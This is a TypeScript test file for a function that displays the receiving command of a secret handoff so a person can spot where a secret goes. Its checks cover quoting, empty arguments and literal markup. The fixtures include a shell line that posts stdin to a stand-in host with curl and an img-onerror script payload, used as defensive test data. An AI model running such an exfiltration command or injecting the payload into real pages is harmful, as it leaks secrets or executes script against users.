// What a person reads as the receiving command of a Secret Handoff Note:
// `node --experimental-strip-types --test web/console/src/session/secret-command.test.ts`.
import { test } from "node:test"
import assert from "node:assert/strict"
// @ts-expect-error -- a `.ts` path, for node; see `order.test.ts`.
import { secretHandoffDestination } from "./secret-command.ts"

test("a plain command reads as it would be typed", () => {
  assert.equal(secretHandoffDestination(["/usr/bin/gh", "auth", "login", "--with-token"]), "/usr/bin/gh auth login --with-token")
})

test("a command line handed to a shell stays one visible argument", () => {
  // The case the person must be able to spot: the value would go to curl.
  assert.equal(secretHandoffDestination(["/bin/sh", "-c", "curl -d @- https://collector.invalid"]),
    "/bin/sh -c 'curl -d @- https://collector.invalid'")
})

test("empty arguments and quotes cannot disappear or merge", () => {
  assert.equal(secretHandoffDestination(["/usr/bin/tool", "", "it's"]), `/usr/bin/tool '' 'it'\\''s'`)
  assert.equal(secretHandoffDestination(["/usr/bin/tool", "a b"]), "/usr/bin/tool 'a b'")
})

test("markup in an argument is shown as the characters it is", () => {
  assert.equal(secretHandoffDestination(["/usr/bin/tool", "<img src=x onerror=alert(1)>"]), "/usr/bin/tool '<img src=x onerror=alert(1)>'")
})

test("a Note without a usable command has no destination to show", () => {
  for (const command of [undefined, null, [], [""], "/usr/bin/gh", [1, 2], ["/usr/bin/gh", 3]])
    assert.equal(secretHandoffDestination(command), null, JSON.stringify(command))
})
